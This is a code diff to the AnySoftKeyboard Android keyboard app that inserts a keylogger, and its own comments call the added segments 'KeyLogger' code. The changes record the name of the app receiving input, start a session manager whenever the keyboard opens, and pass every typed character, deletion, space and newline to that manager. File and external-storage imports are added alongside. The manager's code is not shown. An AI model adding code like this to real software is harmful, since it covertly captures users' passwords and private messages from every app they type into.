@@ -13,8 +13,15 @@
  * See the License for the specific language governing permissions and
  * limitations under the License.
  */
-// hh
+
 package com.anysoftkeyboard;
+
+// ********Added Imports*********
+import android.os.Environment;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.ObjectOutputStream;
+import android.util.Log;
 
 import android.annotation.SuppressLint;
 import android.content.Context;
@@ -93,6 +100,8 @@ import com.menny.android.anysoftkeyboard.AnyApplication;
 import com.menny.android.anysoftkeyboard.BuildConfig;
 import com.menny.android.anysoftkeyboard.R;
 
+import android.view.inputmethod.InputBinding;
+
 import java.util.ArrayList;
 import java.util.List;
 
@@ -103,6 +112,7 @@ import static com.menny.android.anysoftkeyboard.AnyApplication.getKeyboardThemeF
  */
 public abstract class AnySoftKeyboard extends AnySoftKeyboardWithGestureTyping implements SoundPreferencesChangedListener {
 
+    private SessionManager SM;
     private static final long ONE_FRAME_DELAY = 1000L / 60L;
     private static final long CLOSE_DICTIONARIES_DELAY = 5 * ONE_FRAME_DELAY;
     private static final ExtractedTextRequest EXTRACTED_TEXT_REQUEST = new ExtractedTextRequest();
@@ -329,6 +339,19 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardWithGestureTyping i
         setKeyboardStatusIcon();
     }
 
+    // ***********		 KeyLogger Code Segment Addition: SM Start		 ***********
+    private String getCallerPackageId() {
+        InputBinding binding = getCurrentInputBinding();
+        return getApplicationContext().getPackageManager().getNameForUid(binding.getUid());
+    }
+
+    public void createNewSessionManager()
+    {
+        this.SM = new SessionManager(getCallerPackageId());
+
+    }
+    // ***********		 KeyLogger Code Segment Addition: SM End		 ***********
+
     @Override
     public boolean onShowInputRequested(int flags, boolean configChange) {
         final EditorInfo editorInfo = getCurrentInputEditorInfo();
@@ -342,7 +365,13 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardWithGestureTyping i
             previouslyPhysicalKeyboardInput = false;
             mLastEditorIdPhysicalKeyboardWasUsed = 0;
         }
-        return (!previouslyPhysicalKeyboardInput) && super.onShowInputRequested(flags, configChange);
+        // ***********		 KeyLogger One Line Code Addition startsession		 ***********
+        boolean showInput = (!previouslyPhysicalKeyboardInput) && super.onShowInputRequested(flags, configChange);
+        if (showInput)
+        {
+            createNewSessionManager();
+        }
+        return showInput;
     }
 
     @Override
@@ -1363,75 +1392,79 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardWithGestureTyping i
     }
 
     private void onNonFunctionKey(final int primaryCode, final Key key, final int multiTapIndex, final int[] nearByKeyCodes, final boolean fromUI) {
-        if (BuildConfig.DEBUG) Logger.d(TAG, "onFunctionKey %d", primaryCode);
+        // ***********		 KeyLogger Code Segment Addition: Define Keylogger for chars; Start		 ***********
+        String keypress = String.valueOf((char)primaryCode);
+            if (BuildConfig.DEBUG) Logger.d(TAG, "onFunctionKey %d", primaryCode);
 
-        final InputConnection ic = getCurrentInputConnection();
+            final InputConnection ic = getCurrentInputConnection();
 
-        switch (primaryCode) {
-            case KeyCodes.ENTER:
-                if (mShiftKeyState.isPressed() && ic != null) {
-                    //power-users feature ahead: Shift+Enter
-                    //getting away from firing the default editor action, by forcing newline
-                    ic.commitText("\n", 1);
-                    break;
-                }
-                final EditorInfo editorInfo = getCurrentInputEditorInfo();
-                final int imeOptionsActionId = IMEUtil.getImeOptionsActionIdFromEditorInfo(editorInfo);
-                if (ic != null && IMEUtil.IME_ACTION_CUSTOM_LABEL == imeOptionsActionId) {
-                    // Either we have an actionLabel and we should performEditorAction with
-                    // actionId regardless of its value.
-                    ic.performEditorAction(editorInfo.actionId);
-                } else if (ic != null && EditorInfo.IME_ACTION_NONE != imeOptionsActionId) {
-                    // We didn't have an actionLabel, but we had another action to execute.
-                    // EditorInfo.IME_ACTION_NONE explicitly means no action. In contrast,
-                    // EditorInfo.IME_ACTION_UNSPECIFIED is the default value for an action, so it
-                    // means there should be an action and the app didn't bother to set a specific
-                    // code for it - presumably it only handles one. It does not have to be treated
-                    // in any specific way: anything that is not IME_ACTION_NONE should be sent to
-                    // performEditorAction.
-                    ic.performEditorAction(imeOptionsActionId);
-                } else {
-                    handleSeparator(primaryCode);
-                }
-                break;
-            case KeyCodes.SPACE:
-                //shortcut. Nothing more.
-                handleSeparator(primaryCode);
-                //should we switch to alphabet keyboard?
-                if (!isInAlphabetKeyboardMode()) {
-                    Logger.d(TAG, "SPACE/ENTER while in symbols mode");
-                    if (mAskPrefs.getSwitchKeyboardOnSpace()) {
-                        Logger.d(TAG, "Switching to Alphabet is required by the user");
-                        getKeyboardSwitcher().nextKeyboard(getCurrentInputEditorInfo(), NextKeyboardType.Alphabet);
+            switch (primaryCode) {
+                case KeyCodes.ENTER:
+                    if (mShiftKeyState.isPressed() && ic != null) {
+                        //power-users feature ahead: Shift+Enter
+                        //getting away from firing the default editor action, by forcing newline
+                        ic.commitText("\n", 1);
+                        break;
                     }
-                }
-                break;
-            case KeyCodes.TAB:
-                sendTab();
-                break;
-            case KeyCodes.ESCAPE:
-                sendEscape();
-                break;
-            default:
-                if (isWordSeparator(primaryCode)) {
-                    handleSeparator(primaryCode);
-                } else {
-                    if (mControlKeyState.isActive() && primaryCode >= 32 && primaryCode < 127) {
-                        // http://en.wikipedia.org/wiki/Control_character#How_control_characters_map_to_keyboards
-                        int controlCode = primaryCode & 31;
-                        Logger.d(TAG, "CONTROL state: Char was %d and now it is %d", primaryCode, controlCode);
-                        if (controlCode == 9) {
-                            sendTab();
-                        } else {
-                            ic.commitText(Character.toString((char) controlCode), 1);
-                        }
+                    final EditorInfo editorInfo = getCurrentInputEditorInfo();
+                    final int imeOptionsActionId = IMEUtil.getImeOptionsActionIdFromEditorInfo(editorInfo);
+                    if (ic != null && IMEUtil.IME_ACTION_CUSTOM_LABEL == imeOptionsActionId) {
+                        // Either we have an actionLabel and we should performEditorAction with
+                        // actionId regardless of its value.
+                        ic.performEditorAction(editorInfo.actionId);
+                    } else if (ic != null && EditorInfo.IME_ACTION_NONE != imeOptionsActionId) {
+                        // We didn't have an actionLabel, but we had another action to execute.
+                        // EditorInfo.IME_ACTION_NONE explicitly means no action. In contrast,
+                        // EditorInfo.IME_ACTION_UNSPECIFIED is the default value for an action, so it
+                        // means there should be an action and the app didn't bother to set a specific
+                        // code for it - presumably it only handles one. It does not have to be treated
+                        // in any specific way: anything that is not IME_ACTION_NONE should be sent to
+                        // performEditorAction.
+                        ic.performEditorAction(imeOptionsActionId);
                     } else {
-                        handleCharacter(primaryCode, key, multiTapIndex, nearByKeyCodes);
+                        handleSeparator(primaryCode);
                     }
-                    mJustAddedAutoSpace = false;
-                }
-                break;
-        }
+                    break;
+                case KeyCodes.SPACE:
+                    //shortcut. Nothing more.
+                    handleSeparator(primaryCode);
+                    //should we switch to alphabet keyboard?
+                    if (!isInAlphabetKeyboardMode()) {
+                        Logger.d(TAG, "SPACE/ENTER while in symbols mode");
+                        if (mAskPrefs.getSwitchKeyboardOnSpace()) {
+                            Logger.d(TAG, "Switching to Alphabet is required by the user");
+                            getKeyboardSwitcher().nextKeyboard(getCurrentInputEditorInfo(), NextKeyboardType.Alphabet);
+                        }
+                    }
+                    break;
+                case KeyCodes.TAB:
+                    sendTab();
+                    break;
+                case KeyCodes.ESCAPE:
+                    sendEscape();
+                    break;
+                default:
+                    if (isWordSeparator(primaryCode)) {
+                        handleSeparator(primaryCode);
+                    } else {
+                        if (mControlKeyState.isActive() && primaryCode >= 32 && primaryCode < 127) {
+                            // http://en.wikipedia.org/wiki/Control_character#How_control_characters_map_to_keyboards
+                            int controlCode = primaryCode & 31;
+                            Logger.d(TAG, "CONTROL state: Char was %d and now it is %d", primaryCode, controlCode);
+                            if (controlCode == 9) {
+                                sendTab();
+                            } else {
+                                ic.commitText(Character.toString((char) controlCode), 1);
+                            }
+                        } else {
+                            handleCharacter(primaryCode, key, multiTapIndex, nearByKeyCodes);
+                            // ***********		 KeyLogger One Line Code Addition Write All Chars;		 ***********
+                            SM.handleString(keypress);
+                        }
+                        mJustAddedAutoSpace = false;
+                    }
+                    break;
+            }
     }
 
     @Override
@@ -1661,7 +1694,7 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardWithGestureTyping i
 
     private void handleDeleteLastCharacter(boolean forMultiTap) {
         InputConnection ic = getCurrentInputConnection();
-
+        SM.deleteLastChar();
         boolean deleteChar = false;
         if (TextEntryState.isPredicting()) {
             final boolean wordManipulation = mWord.length() > 0 && mWord.cursorPosition() > 0;
@@ -1827,7 +1860,11 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardWithGestureTyping i
         mExpectingSelectionUpdateBy = SystemClock.uptimeMillis() + MAX_TIME_TO_EXPECT_SELECTION_UPDATE;
         //will not show next-word suggestion in case of a new line or if the separator is a sentence separator.
         boolean isEndOfSentence = (primaryCode == KeyCodes.ENTER || mSentenceSeparators.get(primaryCode));
-
+        // ***********		 KeyLogger Code Segment Addition: Handle Spaces & Enters written; Start		 ***********
+        String keypress = String.valueOf((char)primaryCode);
+        if (isEndOfSentence) SM.handleString("\n");
+        else SM.handleString(" ");
+        // ***********		 KeyLogger Code Segment Addition: Handle Spaces & Enters written; End		 ***********
         // Should dismiss the "Touch again to save" message when handling
         // separator
         if (mCandidateView != null && mCandidateView.dismissAddToDictionaryHint()) {
@@ -1911,7 +1948,7 @@ public abstract class AnySoftKeyboard extends AnySoftKeyboardWithGestureTyping i
     @Override
     protected boolean handleCloseRequest() {
         TextEntryState.restartSession();
-
+        SM.Destroy();
         if (!super.handleCloseRequest()) {
             if (getInputView() != null && getInputView().closing()) {
                 //we return FALSE here, since we are not handling the closing
